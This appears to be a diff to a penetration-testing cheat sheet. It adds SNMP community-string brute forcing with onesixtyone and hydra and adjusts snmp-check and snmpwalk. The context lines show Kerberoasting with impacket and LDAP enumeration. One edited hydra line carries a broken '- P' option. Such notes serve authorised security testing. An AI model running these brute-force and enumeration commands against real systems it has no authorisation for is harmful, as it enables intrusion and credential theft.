@@ -340,16 +340,18 @@ nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=80530636
 while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs $DOM/ -dc-ip $TARGET -request-user '$user' -k -no-pass; done < usernames
 
 [*] (161) SNMP
+(onesixtyone $TARGET -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt -w 5 -o SNMPsmall.onesixtyone &)
+(onesixtyone $TARGET -c /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -w 5 -o SNMPhuge.onesixtyone &)
 (hydra snmpv2c://$TARGET -P /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt -t60 -I 2>/dev/null | grep '\[snmp\]' | tee SNMPsmall.hydra &)
-(hydra snmpv2c://$TARGET -P /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t60 -I 2>/dev/null | grep '\[snmp\]' | tee SNMPhuge.hydra &)
+(hydra snmpv2c://$TARGET - P /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t60 -I 2>/dev/null | grep '\[snmp\]' | tee SNMPhuge.hydra &)
 
+cat *.onesixtyone
 cat *.hydra
 
-snmp-check $TARGET -c COMMUNITY
+snmp-check $TARGET -c COMMUNITY -v 2c
 
 sudo nmap -sU -p161 --script "snmp* and not snmp-brute" $TARGET
-onesixtyone $TARGET -c SNMPcommunities
-snmpwalk -v1 -c SNMPstring $TARGET | grep 'STRING:'
+snmpwalk -v2c -c COMMUNITY $TARGET | grep 'STRING:'
 
 [*] (389) LDAP
 (nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET' &)
